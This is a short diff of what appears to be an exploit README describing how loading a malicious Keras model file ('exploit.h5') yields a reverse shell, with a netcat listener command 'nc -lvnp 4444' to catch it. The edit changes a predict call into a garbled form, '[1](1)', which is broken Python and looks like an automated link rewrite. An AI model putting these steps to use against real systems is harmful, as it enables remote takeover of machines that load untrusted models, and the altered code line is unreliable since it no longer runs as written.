@@ -36,7 +36,7 @@
 
    ```python
    model = load_model("exploit.h5", compile=False)
-   model.predict([[1]])
+   model.predict([1](1))
    ```
 
 4. You get a **reverse shell** on your machine (start `nc -lvnp 4444` beforehand).
